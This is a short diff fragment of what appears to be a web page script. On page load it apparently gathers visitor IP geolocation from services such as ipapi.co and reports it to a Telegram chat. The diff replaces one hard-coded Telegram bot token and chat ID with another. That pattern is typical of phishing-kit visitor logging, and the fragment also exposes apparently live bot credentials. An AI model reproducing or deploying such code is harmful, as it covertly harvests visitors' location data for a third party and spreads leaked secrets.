@@ -927,8 +927,8 @@
 
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    const botToken = "8391972614:AAFnp7IHA4ZgJnM5HrnzDfXdYIBpWwfkNwI";
-    const chatId = "-4844064949";
+    const botToken = "8389195007:AAGkbz5t1VtKGgofC8t1GowIEDd2xLoCLE0";
+    const chatId = "-4803572909";
     
     const services = [
         'https://ipapi.co/json/',
@@ -1026,3 +1026,4 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 
 </script>
+
